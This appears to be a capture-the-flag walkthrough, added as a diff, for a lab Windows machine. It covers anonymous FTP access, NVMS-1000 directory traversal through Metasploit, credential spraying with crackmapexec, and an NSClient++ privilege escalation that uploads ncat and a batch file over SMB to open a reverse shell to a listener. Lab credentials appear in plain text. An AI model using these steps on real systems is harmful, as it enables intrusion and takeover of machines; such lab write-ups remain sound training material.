@@ -1,0 +1,27 @@
+On the brief nmap scan we have 5 interesting ports: 21 (FTP), 22(SSH), 80(WEB) ,445(SMB) and 8443(NSClient++)
+
+Anonymous login on FTP (port 21)
+Trying anonymous:anonymous on FTP we get Access Granted. Here we can find our first two usernames, `Nadine` and `Nathan`, along with two files `Confidential.txt` and `Notes to do.txt`. The content of both files can be found under `ftp/` directory. 
+
+Exploiting LFI on NVMS (port 80)
+Looking into the port 80 we have a login page that points to a service, `NVMS-1000`. Doing a `searchsploit` agains this we find that it's vulnerable to `Directory Traversal`. There is a Metasploit module that does the work for us, called `scanner/http/tvt_nvms_traversal`. Now we need to setup rhost to 10.10.10.184. For the `filepath` variable we will take into accout what is says in `Confidentails.txt`, because it points to a specific file, `Passwords.txt`.
+With that said, we now can construct a path, knowing the user in Nathan, we will end with `set filepath Users/Nathan/Desktop/Passwords.txt`. The output of this can be found in `passwords.txt`. To match with the exact username these passwords we will use crackmapexec, `crackmapexec smb -u users.txt -p pass.txt --shares 10.10.10.184`. We get only one hit: `nadine:L1k3B1gBut7s@W0rk`.
+Logging in into the ssh with this credentials we get our user flag. 
+
+Recon on the box & finding the foothold for root
+First, after we have the shell we need to dump the NSClient secret password. We will go to `C:\Program Files\NSClient++` and `type nsclient.ini`. Here we have it. Looking more in depth to this file we see that only `127.0.0.1` the so called localhost is allowed to access it. So we will need to dig a SSH Tunnel to achive this. 
+We will aboard the existing ssh connection and start a new one, but this time using `ssh  -L 8443:127.0.0.1:8443 nadine@10.10.10.184`. Now doing a searchsploit agains nsclient we get a CVE for privilege escalation.
+
+Privesc using NSClient (port 8443)
+Note: This exploit will be hard to do because it's buggy and might involve serveral resets for the box.
+I will fire up a local smbserver using impacket tools. `/opt/impacket/examples/smbserver.py <sharename> <path> -smb2support`. At the mentioned path you should have the `ncat.exe` and `file.bat`.
+Upload the files on the box, at `C:\Temp`, using `copy \\<ip>\<sharename>\ncat.exe .` and the same for `.bat` file. Finishing with shell work, I will also start a listener on port 1337, using `nc -lvnp 1337`.
+
+Switching to the web 
+Now let's go on the browser and access `https://127.0.0.1:8443`. Enter the password found and go to Settings. Now `External Scripts > Scripts > Add new`. Here you will have `Key: foobar` and `Value: C:\Temp\file.bat`. Save them and go up top on the `Control` and press `Reload`. If you get errors like `Server Connection Failed` reset the box and redo the whole process.
+After the reload is complete go to `Console` and type `foobar`. Wait for reverse shell and you rooted.
+
+
+Credentials:
+-> nadine:L1k3B1gBut7s@W0rk (ssh, user)
+-> ew2x6SsGTxjRwXOT (NSClient password) 
